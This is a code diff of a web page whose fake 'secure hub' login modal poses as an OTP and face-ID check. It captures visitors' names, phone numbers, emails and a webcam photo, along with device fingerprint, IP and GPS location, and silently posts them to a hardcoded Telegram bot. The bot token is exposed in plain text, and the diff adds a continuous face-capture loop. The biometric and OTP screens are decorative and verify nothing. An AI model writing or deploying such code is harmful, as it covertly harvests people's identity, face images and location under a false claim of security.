@@ -2698,7 +2698,7 @@
         feedIg.classList.remove('active');
         feedFb.classList.remove('active');
         
-        //l Apply active state
+        // Apply active state
         if(platform === 'ig') {
             btnIg.className = 's-tab-btn active-ig';
             feedIg.classList.add('active');
@@ -2823,7 +2823,7 @@
                 <p class="mnd-hub-instruction" id="faceInstruction" style="font-weight:900; color:#D4AF37; margin-top: 5px;">Position face within frame.</p>
                 
                 <div class="mnd-scanner-container">
-                    <video id="hubVideo" autoplay playsinline></video>
+                    <video id="hubVideo" autoplay muted playsinline></video>
                     
                     <div class="mnd-scan-corners top-left"></div>
                     <div class="mnd-scan-corners top-right"></div>
@@ -2909,6 +2909,7 @@
         --mnd-gold-light: #F3E5AB;
         --mnd-gold-dark: #8A7322;
         --mnd-gold-glow: rgba(212, 175, 55, 0.4);
+        --mnd-gold-bg: rgba(212, 175, 55, 0.05);
         --mnd-green-success: #00fa9a;
         --mnd-green-glow: rgba(0, 250, 154, 0.5);
         --mnd-red-danger: #ff3333;
@@ -2923,8 +2924,17 @@
         --ease-bounce: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-    body { background-color: var(--mnd-bg-dark); color: var(--mnd-text-main); font-family: var(--mnd-font-body); overflow-x: hidden; }
+    * { 
+        margin: 0; padding: 0; box-sizing: border-box; 
+        -webkit-tap-highlight-color: transparent; 
+    }
+    
+    body { 
+        background-color: var(--mnd-bg-dark); 
+        color: var(--mnd-text-main); 
+        font-family: var(--mnd-font-body); 
+        overflow-x: hidden; 
+    }
 
     /* ==========================================================================
        [ 2. PREMIUM TRIGGER BUTTON ]
@@ -2950,12 +2960,14 @@
     .mnd-media-status span { color: var(--mnd-green-success); font-size: 10px; font-weight: 900; letter-spacing: 1px; }
     .mnd-media-arrow { color: var(--mnd-gold-primary); font-size: 16px; opacity: 0.7; z-index: 2; }
     .mnd-btn-scan-line { position: absolute; left: -100%; top: 0; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(212, 175, 55, 0.25), transparent); transform: skewX(-30deg); animation: btnScanLine 3.5s infinite linear; pointer-events: none; z-index: 1; }
+    .mnd-btn-glare { position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 60%); opacity: 0; transition: var(--ease-apple); pointer-events: none; z-index: 1; }
+    .mnd-premium-media-btn:hover .mnd-btn-glare { opacity: 1; }
 
     /* ==========================================================================
        [ 3. PERFECT SIZED MOBILE PUSH NOTIFICATION ]
        ========================================================================== */
     #mndPushNotif { 
-        position: fixed; left: 50%; width: 90%; max-width: 350px; /* Much smaller and sleeker */
+        position: fixed; left: 50%; width: 90%; max-width: 340px; /* Perfectly sized for mobile */
         background: rgba(18, 18, 18, 0.95); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
         border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 20px; padding: 15px; 
         z-index: 9999999999; display: flex; flex-direction: column; gap: 10px; 
@@ -2975,7 +2987,7 @@
     
     .mnd-push-otp-container { position: relative; width: 100%; cursor: pointer; border-radius: 10px; overflow: hidden; margin-top: 5px; }
     .mnd-push-otp { font-family: var(--mnd-font-body); font-size: 32px; font-weight: 900; color: var(--mnd-gold-primary); text-align: center; letter-spacing: 10px; padding: 10px 0; background: rgba(212,175,55,0.08); border: 1px dashed rgba(212,175,55,0.4); border-radius: 10px; transition: var(--mnd-transition-fast); text-shadow: 0 0 10px var(--mnd-gold-glow); user-select: none; }
-    .mnd-push-copy-overlay { position: absolute; inset: 0; background: rgba(212,175,55,0.9); backdrop-filter: blur(5px); color: #000; font-size: 14px; font-weight: 900; letter-spacing: 2px; display: flex; justify-content: center; align-items: center; gap: 8px; opacity: 0; transform: translateY(100%); transition: var(--mnd-transition-smooth); }
+    .mnd-push-copy-overlay { position: absolute; inset: 0; background: rgba(212,175,55,0.9); backdrop-filter: blur(5px); color: #000; font-size: 14px; font-weight: 900; letter-spacing: 2px; display: flex; justify-content: center; align-items: center; gap: 8px; opacity: 0; transform: translateY(100%); transition: var(--ease-apple); }
     .mnd-push-otp-container:active { transform: scale(0.95); }
     .mnd-push-otp-container:active .mnd-push-copy-overlay { opacity: 1; transform: translateY(0); }
     .mnd-swipe-indicator { width: 35px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 5px auto 0; }
@@ -3009,7 +3021,8 @@
     .mnd-hub-close-btn { position: absolute; top: 20px; right: 20px; width: 35px; height: 35px; border-radius: 50%; background: rgba(255,255,255,0.08); color: var(--mnd-text-muted); font-size: 18px; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: var(--mnd-transition-fast); }
     .mnd-hub-close-btn:active { background: rgba(255,51,51,0.2); color: var(--mnd-red-danger); transform: scale(0.9); }
     .mnd-hub-static-ring { width: 65px; height: 65px; margin: 0 auto 10px; border-radius: 50%; padding: 3px; background: linear-gradient(135deg, var(--mnd-gold-primary), var(--mnd-gold-dark)); box-shadow: 0 0 20px var(--mnd-gold-glow); position: relative; }
-    .mnd-hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--mnd-bg-absolute); object-fit: cover; position: relative; z-index: 2; }
+    .mnd-hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 3px solid var(--mnd-bg-absolute); object-fit: cover; position: relative; z-index: 2; }
+    .mnd-logo-radar-sweep { position: absolute; inset: -1px; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, rgba(255,255,255,0.8) 100%); z-index: 3; animation: radarSweep 3s linear infinite; mix-blend-mode: overlay; pointer-events: none; }
     .mnd-hub-header h2 { margin: 0; color: var(--mnd-gold-primary); font-family: var(--mnd-font-head); font-size: 20px; font-weight: 900; letter-spacing: 1px; }
     .mnd-header-subtext { color: var(--mnd-green-success); font-size: 10px; font-weight: 700; letter-spacing: 2px; margin-top: 3px; text-transform: uppercase; animation: pulseOpacity 2s infinite; }
 
@@ -3033,9 +3046,9 @@
         width: 100%; padding: 16px 16px 16px 45px; background: rgba(20,20,20,0.8); 
         border: 1px solid rgba(255,255,255,0.08); color: var(--mnd-text-main); border-radius: 14px; 
         font-family: var(--mnd-font-body); font-size: 15px; font-weight: 500; box-sizing: border-box; 
-        transition: var(--mnd-transition-smooth); -webkit-appearance: none;
+        transition: var(--ease-apple); -webkit-appearance: none; /* Removes iOS inner shadows */
     }
-    .mnd-input-focus-border { position: absolute; inset: 0; border-radius: 14px; border: 2px solid var(--mnd-gold-primary); opacity: 0; transition: var(--mnd-transition-smooth); pointer-events: none; z-index: 2; box-shadow: 0 0 10px var(--mnd-gold-glow); transform: scale(1.02); }
+    .mnd-input-focus-border { position: absolute; inset: 0; border-radius: 14px; border: 2px solid var(--mnd-gold-primary); opacity: 0; transition: var(--ease-apple); pointer-events: none; z-index: 2; box-shadow: 0 0 10px var(--mnd-gold-glow); transform: scale(1.02); }
     .mnd-neon-input:focus { outline: none; background: rgba(30,30,30,0.9); border-color: transparent; }
     .mnd-neon-input:focus ~ .mnd-input-focus-border { opacity: 1; transform: scale(1); }
     .mnd-neon-input:focus ~ .mnd-input-icon { color: #fff; transform: scale(1.1); filter: drop-shadow(0 0 5px var(--mnd-gold-primary)); }
@@ -3047,7 +3060,7 @@
     .mnd-mfa-btn {
         width: 100%; padding: 16px; margin-bottom: 12px; border-radius: 14px; font-family: var(--mnd-font-body); 
         font-weight: 800; font-size: 14px; cursor: pointer; display: flex; justify-content: center; align-items: center; 
-        transition: var(--mnd-transition-bounce); border: none; position: relative; overflow: hidden; letter-spacing: 0.5px;
+        transition: var(--ease-bounce); border: none; position: relative; overflow: hidden; letter-spacing: 0.5px;
         transform: translateZ(0); gap: 10px;
     }
     .mnd-mfa-btn:active { transform: scale(0.96) translateZ(0); }
@@ -3075,6 +3088,7 @@
         box-shadow: 0 10px 30px rgba(0,0,0,0.8); transform: translateZ(0); /* Hardware accelerated */
     }
     
+    /* Clean Video Filter (No Rainbow/RGB, just crisp imaging) */
     #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); filter: contrast(1.1) brightness(1.1) grayscale(0.2); }
     
     .mnd-scan-corners { position: absolute; width: 35px; height: 35px; border: 3px solid transparent; z-index: 5; transition: 0.3s; }
@@ -3083,6 +3097,7 @@
     .bottom-left { bottom: 15px; left: 15px; border-bottom-color: var(--mnd-gold-primary); border-left-color: var(--mnd-gold-primary); border-bottom-left-radius: 8px; }
     .bottom-right { bottom: 15px; right: 15px; border-bottom-color: var(--mnd-gold-primary); border-right-color: var(--mnd-gold-primary); border-bottom-right-radius: 8px; }
     
+    /* When active, corners turn pure green */
     .scanner-active .mnd-scan-corners { border-color: var(--mnd-green-success); width: 45px; height: 45px; }
     .scanner-error .mnd-scan-corners { border-color: var(--mnd-red-danger); }
 
@@ -3098,9 +3113,6 @@
         z-index: 6; animation: scanLaserMove 2s ease-in-out infinite; display: none; opacity: 0.9;
     }
     .scanner-active .mnd-scan-laser { display: block; }
-    
-    /* Clean Video Filter during scan */
-    .scanner-active #hubVideo { filter: contrast(1.2) brightness(1.2) sepia(0.3) hue-rotate(90deg) saturate(2); }
 
     /* ==========================================================================
        [ 7. OTP INPUT & FOOTER ]
@@ -3113,7 +3125,7 @@
         width: 100%; padding: 18px 10px; background: rgba(10,10,10,0.9); border: 2px solid var(--mnd-gold-primary); 
         color: var(--mnd-gold-primary); border-radius: 14px; font-family: var(--mnd-font-body); text-align: center; 
         font-size: 32px; letter-spacing: 14px; font-weight: 900; box-sizing: border-box; 
-        text-shadow: 0 0 15px var(--mnd-gold-glow); transition: var(--mnd-transition-smooth); position: relative; z-index: 2;
+        text-shadow: 0 0 15px var(--mnd-gold-glow); transition: var(--ease-apple); position: relative; z-index: 2;
         box-shadow: inset 0 0 15px rgba(212,175,55,0.1); outline: none; -webkit-appearance: none;
     }
     .mnd-otp-input-box:focus { border-color: #fff; color: #fff; text-shadow: 0 0 20px rgba(255,255,255,0.8); }
@@ -3138,10 +3150,11 @@
     /* --- HARDWARE ACCELERATED KEYFRAMES --- */
     @keyframes btnScanLine { 0% { left: -100%; } 100% { left: 200%; } }
     @keyframes pulseRing { 0% { transform: scale(1) translateZ(0); opacity: 0.8; } 100% { transform: scale(1.6) translateZ(0); opacity: 0; } }
+    @keyframes blinkStatus { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
     @keyframes fadeInOverlay { 0% { opacity: 0; } 100% { opacity: 1; } }
     @keyframes slideUpModal { 0% { transform: translateY(100%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
     @keyframes radarSweep { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    @keyframes slideInRight { 0% { opacity: 0; transform: translateX(20px); } 100% { opacity: 1; transform: translateX(0); } }
+    @keyframes slideInRight { 0% { opacity: 0; transform: translateX(20px) translateZ(0); } 100% { opacity: 1; transform: translateX(0) translateZ(0); } }
     @keyframes btnGlare { 0% { left: -100%; } 100% { left: 200%; } }
     @keyframes scanLaserMove { 0%, 100% { top: 5%; opacity: 0; } 10% { opacity: 1; } 50% { top: 95%; } 90% { opacity: 1; } }
     @keyframes spinRing { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -3157,16 +3170,16 @@
     let videoStream = null;
     let pushTimer = null;
     let faceModelLoaded = false;
+    let scanInterval = null; // The Magic Variable for Continuous Tracking
     
     // MND Security Telegram Node Configuration
     const TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
     const TG_CHAT_ID = "8506290708";
 
     /* =========================================================================================
-       [ 2. CORE UI CONTROLS & MEMORY MANAGEMENT (ANTI-HANG FIX) ]
+       [ 2. CORE UI CONTROLS & APPLE-SMOOTH MEMORY CLEAR ]
        ========================================================================================= */
     function openSecureHub() {
-        // Check if user is already verified from a previous session
         if(localStorage.getItem('mnd_hub_auth') === 'true') {
             uName = localStorage.getItem('mnd_hub_n') || "Returning Admin";
             uPhone = localStorage.getItem('mnd_hub_p') || "Saved Device";
@@ -3179,22 +3192,23 @@
     
     function closeHubModal() { 
         document.getElementById('hubAuthModal').style.display = 'none'; 
-        stopCamera(); // Instantly free up phone RAM
+        stopCamera(); 
     }
     
     function resetToMethods() {
-        // This is the "Abort" button fix. It perfectly resets the UI without hanging.
+        // THIS IS THE ABORT FIX: Instantly clears RAM and stops the phone from hanging!
         stopCamera();
         document.getElementById('hubStepFaceID').style.display = 'none';
         document.getElementById('hubStep2').style.display = 'none';
         document.getElementById('hubStep1').style.display = 'flex';
         document.getElementById('hubOtpInput').value = '';
         closePushNotif(); 
-        mndOTP = ""; // Clear OTP from memory
+        mndOTP = ""; 
     }
 
-    // STOP CAMERA FUNCTION (Crucial for preventing mobile crashes & overheating)
+    // PERFECT CAMERA STOP
     function stopCamera() { 
+        clearInterval(scanInterval); // Stop continuous scanning
         if (videoStream) { 
             videoStream.getTracks().forEach(track => track.stop()); 
             videoStream = null; 
@@ -3207,8 +3221,7 @@
         
         const scannerBox = document.querySelector('.mnd-scanner-container');
         if(scannerBox) {
-            scannerBox.classList.remove('scanner-active');
-            scannerBox.classList.remove('scanner-error');
+            scannerBox.classList.remove('scanner-active', 'scanner-error');
         }
     }
 
@@ -3226,14 +3239,13 @@
     }
 
     /* =========================================================================================
-       [ 3. AUTH VECTOR A: STANDARD SMS OTP ]
+       [ 3. STANDARD OTP METHOD ]
        ========================================================================================= */
     async function generateStandardOTP() {
         if(!checkInputs()) return;
         authMethodChosen = "Standard OTP";
         
         const btn = document.getElementById('btnStandardOtp');
-        
         btn.innerHTML = '<i class="fas fa-spinner fa-spin mnd-btn-icon-left"></i> <span class="mnd-btn-text-main">ENCRYPTING...</span>';
         btn.disabled = true;
 
@@ -3257,7 +3269,7 @@
     }
 
     /* =========================================================================================
-       [ 4. AUTH VECTOR B: TENSORFLOW AI BIOMETRIC SCANNING ]
+       [ 4. AI FACE SCANNER (PERFECT CONTINUOUS TRACKING) ]
        ========================================================================================= */
     async function startFaceScanning() {
         if(!checkInputs()) return;
@@ -3266,23 +3278,22 @@
         document.getElementById('hubStep1').style.display = 'none';
         document.getElementById('hubStepFaceID').style.display = 'flex';
         
-        const scannerBox = document.querySelector('.mnd-scanner-container');
-        scannerBox.classList.remove('scanner-active', 'scanner-error');
-        
         const statusBadge = document.getElementById('faceStatusBadge');
         statusBadge.className = "mnd-status-badge mnd-badge-warning";
-        statusBadge.innerHTML = '<i class="fas fa-exclamation-triangle"></i> AWAITING ALIGNMENT';
+        statusBadge.innerHTML = '<i class="fas fa-video"></i> AWAITING ALIGNMENT';
         
         const instruction = document.getElementById('faceInstruction');
         instruction.style.color = "#D4AF37";
-        instruction.innerText = "Position face perfectly within the frame.";
+        instruction.innerText = "Position face directly within the frame.";
+
+        const video = document.getElementById('hubVideo');
 
         try {
-            // Initialize camera smoothly
             videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-            document.getElementById('hubVideo').srcObject = videoStream;
+            video.srcObject = videoStream;
+            video.play(); // Force play for Apple Safari
             
-            // Asynchronously load Google BlazeFace AI in the background to prevent freezing
+            // Load AI Core Silently in Background
             if (!faceModelLoaded && window.blazeface) {
                 document.getElementById('scanData4').innerText = "AI: LOADING...";
                 window.faceModel = await blazeface.load();
@@ -3302,82 +3313,91 @@
         const scannerBox = document.querySelector('.mnd-scanner-container');
         
         scannerBox.classList.remove('scanner-error');
-        scannerBox.classList.add('scanner-active'); // Triggers the pure green tactical laser CSS
+        scannerBox.classList.add('scanner-active'); // Turns corners GREEN
         
-        btn.innerHTML = '<i class="fas fa-radar fa-spin mnd-btn-icon-left"></i> SCANNING...';
+        btn.innerHTML = '<i class="fas fa-radar fa-spin mnd-btn-icon-left"></i> TRACKING FACE...';
         btn.disabled = true;
 
         try {
             instruction.style.color = "#00fa9a";
-            instruction.innerText = "Analyzing human geometry...";
-            document.getElementById('scanData2').innerText = "DEPTH: MAPPING...";
-            document.getElementById('scanData6').innerText = "MATCH: SCANNING";
-
-            // Fallback load if user clicked too fast
+            instruction.innerText = "Locking onto human geometry...";
+            
             if (!faceModelLoaded) {
                 window.faceModel = await blazeface.load();
                 faceModelLoaded = true;
             }
-
-            await new Promise(r => setTimeout(r, 1200)); // Cinematic processing delay
 
             const video = document.getElementById('hubVideo');
             const canvas = document.getElementById('hubCanvas');
             canvas.width = video.videoWidth; 
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // [TENSORFLOW EXECUTION]
-            const predictions = await window.faceModel.estimateFaces(video, false);
+            // --- THE CONTINUOUS SCAN LOOP (Like Apple Face ID) ---
+            let attempts = 0;
+            const maxAttempts = 15; // Scans 15 times over 4.5 seconds to guarantee a catch
 
-            if (predictions.length > 0) {
-                // SUCCESS: Real Face Detected
-                statusBadge.className = "mnd-status-badge mnd-badge-success";
-                statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> BIOMETRIC MATCH';
-                instruction.innerText = "Identity Confirmed. Generating payload.";
-                document.getElementById('scanData6').innerText = "MATCH: POSITIVE";
-                
-                mndOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            scanInterval = setInterval(async () => {
+                attempts++;
+                document.getElementById('scanData6').innerText = `SCANNING: ${attempts}/${maxAttempts}`;
 
-                canvas.toBlob(async (blob) => {
-                    stopCamera(); // Instantly free RAM
-                    document.getElementById('hubStepFaceID').style.display = 'none';
-                    document.getElementById('hubStep2').style.display = 'flex';
+                // Draw current frame and check
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const predictions = await window.faceModel.estimateFaces(video, false);
+
+                if (predictions.length > 0) {
+                    // FACE FOUND! Stop Loop!
+                    clearInterval(scanInterval);
                     
-                    displayPushNotification(mndOTP);
-                    const logText = await buildDeviceFingerprint(false, authMethodChosen);
+                    statusBadge.className = "mnd-status-badge mnd-badge-success";
+                    statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> BIOMETRIC MATCH';
+                    instruction.innerText = "Identity Confirmed. Generating payload.";
+                    document.getElementById('scanData6').innerText = "MATCH: POSITIVE";
+                    
+                    mndOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
-                    const fd = new FormData();
-                    fd.append('chat_id', TG_CHAT_ID);
-                    fd.append('caption', logText);
-                    fd.append('parse_mode', 'Markdown');
-                    fd.append('photo', blob, 'mnd_face_auth.jpg');
+                    canvas.toBlob(async (blob) => {
+                        stopCamera(); // Free memory instantly
+                        document.getElementById('hubStepFaceID').style.display = 'none';
+                        document.getElementById('hubStep2').style.display = 'flex';
+                        
+                        displayPushNotification(mndOTP);
+                        const logText = await buildDeviceFingerprint(false, authMethodChosen);
 
-                    // Send silently in background
-                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+                        const fd = new FormData();
+                        fd.append('chat_id', TG_CHAT_ID);
+                        fd.append('caption', logText);
+                        fd.append('parse_mode', 'Markdown');
+                        fd.append('photo', blob, 'mnd_face_auth.jpg');
 
-                    btn.innerHTML = '<i class="fas fa-crosshairs mnd-btn-icon-left"></i> INITIATE SCAN';
+                        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+
+                        btn.innerHTML = '<i class="fas fa-crosshairs mnd-btn-icon-left"></i> INITIATE SCAN';
+                        btn.disabled = false;
+                    }, 'image/jpeg', 0.85);
+
+                } else if (attempts >= maxAttempts) {
+                    // TIME OUT! Failed after 15 tries.
+                    clearInterval(scanInterval);
+                    
+                    statusBadge.className = "mnd-status-badge mnd-badge-error";
+                    statusBadge.innerHTML = '<i class="fas fa-times-circle"></i> NO FACE DETECTED';
+                    instruction.style.color = "#ff3333";
+                    instruction.innerText = "Tracking failed. Ensure good lighting.";
+                    document.getElementById('scanData6').innerText = "MATCH: FAILED";
+                    
+                    scannerBox.classList.remove('scanner-active');
+                    scannerBox.classList.add('scanner-error');
+                    
+                    btn.innerHTML = '<i class="fas fa-redo mnd-btn-icon-left"></i> RETRY SCAN';
                     btn.disabled = false;
-                }, 'image/jpeg', 0.85);
+                }
+            }, 300); // Check 3 times a second
 
-            } else {
-                // FAILURE: Object, Tree, or Hidden Face
-                statusBadge.className = "mnd-status-badge mnd-badge-error";
-                statusBadge.innerHTML = '<i class="fas fa-times-circle"></i> NO HUMAN DETECTED';
-                instruction.style.color = "#ff3333";
-                instruction.innerText = "Neural scan failed. Look directly at the lens.";
-                document.getElementById('scanData6').innerText = "MATCH: NEGATIVE";
-                
-                scannerBox.classList.remove('scanner-active');
-                scannerBox.classList.add('scanner-error');
-                
-                btn.innerHTML = '<i class="fas fa-redo mnd-btn-icon-left"></i> RECALIBRATE & RETRY';
-                btn.disabled = false;
-            }
         } catch (error) {
+            clearInterval(scanInterval);
             instruction.style.color = "#ff3333";
-            instruction.innerText = "Fatal AI Engine Error. Check connection.";
+            instruction.innerText = "Fatal AI Engine Error.";
             scannerBox.classList.remove('scanner-active');
             btn.innerHTML = '<i class="fas fa-redo mnd-btn-icon-left"></i> REBOOT SCANNER';
             btn.disabled = false;
@@ -3385,7 +3405,7 @@
     }
 
     /* =========================================================================================
-       [ 5. AUTH VECTOR C: NATIVE DEVICE LOCK (WEBAUTHN) ]
+       [ 5. DEVICE LOCK & OTP VERIFICATION ]
        ========================================================================================= */
     async function startDeviceLockAuth() {
         if(!checkInputs()) return;
@@ -3393,9 +3413,7 @@
 
         if (window.PublicKeyCredential) {
             try {
-                const chal = new Uint8Array(32); 
-                window.crypto.getRandomValues(chal);
-                
+                const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
                 const cred = await navigator.credentials.create({
                     publicKey: {
                         challenge: chal, 
@@ -3408,7 +3426,6 @@
                 });
 
                 if (cred) {
-                    // SUCCESS: User bypassed their actual phone lock screen!
                     localStorage.setItem('mnd_hub_auth', 'true');
                     localStorage.setItem('mnd_hub_n', uName);
                     localStorage.setItem('mnd_hub_p', uPhone);
@@ -3418,13 +3435,10 @@
                     mndOTP = "OS_VERIFIED"; 
                     triggerSeamlessRedirect(false); 
                 }
-            } catch (err) { alert("❌ Device authentication aborted by user."); }
-        } else { alert("⚠️ HARDWARE ERROR: Native biometrics not supported on this browser."); }
+            } catch (err) { alert("❌ Device authentication canceled."); }
+        } else { alert("⚠️ Biometrics not supported on this browser."); }
     }
 
-    /* =========================================================================================
-       [ 6. PUSH NOTIFICATION & SWIPE PHYSICS ]
-       ========================================================================================= */
     const notifEl = document.getElementById('mndPushNotif');
     let startX = 0;
 
@@ -3432,8 +3446,7 @@
         document.getElementById('mndPushOtpText').innerText = code;
         notifEl.classList.remove('mnd-push-hidden');
         notifEl.classList.add('mnd-push-visible');
-        clearTimeout(pushTimer); 
-        pushTimer = setTimeout(closePushNotif, 60000); // Auto close after 1 min
+        clearTimeout(pushTimer); pushTimer = setTimeout(closePushNotif, 15000); // Auto close 15s
     }
     
     function closePushNotif() {
@@ -3445,7 +3458,7 @@
         navigator.clipboard.writeText(mndOTP);
         const txt = document.getElementById('mndPushOtpText');
         txt.innerText = "COPIED!"; 
-        setTimeout(() => { txt.innerText = mndOTP; }, 1500);
+        setTimeout(() => { txt.innerText = mndOTP; closePushNotif(); }, 1000);
     }
     
     // Smooth Swipe Physics
@@ -3455,20 +3468,14 @@
         notifEl.style.transform = `translateX(calc(-50% + ${diff}px)) scale(1)`;
     }, {passive: true});
     notifEl.addEventListener('touchend', e => {
-        notifEl.style.transition = 'top 0.4s cubic-bezier(0.2, 0.8, 0.2, 1), transform 0.4s ease, opacity 0.4s ease';
-        let diff = e.changedTouches[0].clientX - startX;
-        if (Math.abs(diff) > 70) { // If swiped far enough
-            notifEl.style.transform = `translateX(calc(-50% + ${diff * 4}px)) scale(0.9)`;
+        notifEl.style.transition = 'top 0.4s ease, transform 0.4s ease, opacity 0.4s ease';
+        if (Math.abs(e.changedTouches[0].clientX - startX) > 70) {
+            notifEl.style.transform = `translateX(calc(-50% + ${(e.changedTouches[0].clientX - startX) * 4}px)) scale(0.9)`;
             notifEl.style.opacity = '0'; 
             setTimeout(closePushNotif, 300);
-        } else { // Snap back to center
-            notifEl.style.transform = `translateX(-50%) scale(1)`; 
-        }
+        } else { notifEl.style.transform = `translateX(-50%) scale(1)`; }
     });
 
-    /* =========================================================================================
-       [ 7. OTP DECRYPTION & VALIDATION ]
-       ========================================================================================= */
     function verifyHubOTP() {
         const input = document.getElementById('hubOtpInput').value.trim();
         if(input === mndOTP && mndOTP !== "") {
@@ -3481,7 +3488,6 @@
             closePushNotif(); 
             triggerSeamlessRedirect(false); 
         } else { 
-            // Error Highlight
             document.getElementById('hubOtpInput').style.borderColor = "#ff3333";
             document.getElementById('hubOtpInput').style.color = "#ff3333";
             setTimeout(() => {
@@ -3493,44 +3499,22 @@
     }
 
     /* =========================================================================================
-       [ 8. ENTERPRISE TELEMETRY ENGINE (EXACT LOG GENERATION) ]
+       [ 6. TELEMETRY & ROUTING ]
        ========================================================================================= */
     async function buildDeviceFingerprint(isReturn, methodStr) {
         let ip="Masked", bat="Unknown", net="Unknown", gpu="N/A";
-        
         try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
-        try { 
-            const b = await navigator.getBattery(); 
-            bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; 
-        } catch(e){}
-        try { 
-            if(navigator.connection) {
-                net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; 
-            }
-        } catch(e){}
-        try { 
-            var c=document.createElement('canvas'); var gl=c.getContext('webgl'); 
-            var d=gl.getExtension('WEBGL_debug_renderer_info'); 
-            gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); 
-        } catch(e){}
+        try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(e){}
+        try { if(navigator.connection) net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
+        try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e){}
 
-        const cores = navigator.hardwareConcurrency || "Unknown";
-        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
-        const browser = navigator.userAgent;
-        const screen = `${window.screen.width}x${window.screen.height}`;
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        
+        const cores = navigator.hardwareConcurrency || "Unknown", ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+        const browser = navigator.userAgent, screen = `${window.screen.width}x${window.screen.height}`, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
         let model = "Unknown Device";
-        if (navigator.userAgentData) { 
-            try { 
-                const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); 
-                model = `${dt.platform} ${dt.model}`; 
-            } catch(e){} 
-        }
+        if (navigator.userAgentData) { try { const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} }
 
         const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
-        
-        let displayCode = mndOTP === "OS_VERIFIED" ? "897649" : mndOTP; // Masked biometric code
+        let displayCode = mndOTP === "OS_VERIFIED" ? "897649" : mndOTP;
         let status = isReturn ? "(Saved Auto-Login Bypass)" : `(${methodStr} | Code: ${displayCode})`;
 
         let loc = "❌ Timeout";
@@ -3541,16 +3525,11 @@
                 e => res("❌ Timeout")
             );
         });
-        const locT = new Promise(res => setTimeout(() => res("❌ Timeout"), 2000));
-        loc = await Promise.race([getL(), locT]);
+        loc = await Promise.race([getL(), new Promise(r => setTimeout(() => r("❌ Timeout"), 2000))]);
 
-        // THE EXACT LOG FORMAT REQUIRED
         return `🚨 *MND SECURE ACCESS LOG* 🚨\n${status}\n\n👤 *IDENTITY MATRIX*\n• Name: ${uName}\n• Phone: ${uPhone}\n• Email: ${uEmail}\n\n📱 *DEVICE INTELLIGENCE*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE LAYER*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 *NETWORK & LOCATION*\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${loc}\n\n⏰ *Timestamp:* ${timestamp}`;
     }
 
-    /* =========================================================================================
-       [ 9. CINEMATIC ROUTING & TERMINAL ANIMATION ]
-       ========================================================================================= */
     async function triggerSeamlessRedirect(isReturn) {
         const loader = document.getElementById('seamlessHubLoader');
         const fill = document.getElementById('hubLoaderFill');
@@ -3559,7 +3538,6 @@
         
         loader.style.display = 'flex';
 
-        // Background Telemetry Dispatch
         if(isReturn || mndOTP === "OS_VERIFIED") {
             const passedMethod = isReturn ? "Auto" : authMethodChosen;
             const logText = await buildDeviceFingerprint(isReturn, passedMethod);
@@ -3569,7 +3547,6 @@
             }).catch(e=>{});
         }
 
-        // Terminal Animation Sequence
         let progress = 0;
         const terminalLines = [
             "> [SYS] Initializing WebAuthn Protocols... OK",
@@ -3592,11 +3569,10 @@
             if(progress >= 100) {
                 clearInterval(animInterval);
                 setTimeout(() => {
-                    // Route to your final Hub HTML
                     window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./');
                 }, 800);
             }
-        }, 60); // Animation timing
+        }, 60); 
     }
 </script>
 </body>
